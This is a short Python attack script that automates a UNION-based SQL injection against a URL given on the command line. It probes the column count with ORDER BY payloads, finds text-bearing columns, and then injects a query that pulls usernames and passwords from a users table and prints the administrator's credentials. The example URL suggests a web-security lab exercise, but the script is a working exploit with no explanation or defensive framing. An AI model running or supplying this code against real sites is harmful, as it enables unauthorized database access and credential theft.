#!/usr/bin/python3
import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def find_colum_no(url):
    for i in range(1,50):
        payload = "'+order+by+%s--" %i
        res = requests.get(url + payload, verify=False, proxies=proxies)
        if "Internal Server Error" in res.text:
            return i-1

def finding_text(url, num):
    count = 0
    for i in range(1, num+1):
        string = "'sandeep'"
        payload_list = ['null'] * num
        payload_list[i-1] = string
        union_payload = "'union select " + ','.join(payload_list) + "--"
        re = requests.get(url+ union_payload, verify=False, proxies=proxies)
        if 'sandeep' in re.text:
            print("[-] column %s contains string" % i)
            count += 1
    return count

def dumping_cred(url,num,count):
    string = "username||'-'||password from users"
    payload_list = ['null'] * num
    # print(payload_list)
    payload_list[count-1] = string
    # print(payload_list)
    union_payload = "'union select " + ','.join(payload_list) + " --"
    re = requests.get(url+ union_payload, verify=False, proxies=proxies)
    if "administrator" in re.text:
        print("[-] Admin credentials found ...")
        soup = BeautifulSoup(re.text, "html.parser")
        for i in soup.find_all('td'):
            if "administrator" in i.string:
                td = str(i)[4:-5]
                print(" -> username-password : "+td)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("Usages: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com/filter?category=Pets")
        sys.exit(-1)
    
    print("[+] Finding number of columns.......")
    num_cols = find_colum_no(url)
    print("[-] Number of columns: ", num_cols)

    print("\n[+]Finding columns containing text......")
    count = finding_text(url,num_cols)

    print("\n[+] Dumping the Administrator of username and Passwords.......")
    # print(count)
    dumping_cred(url,num_cols,count)
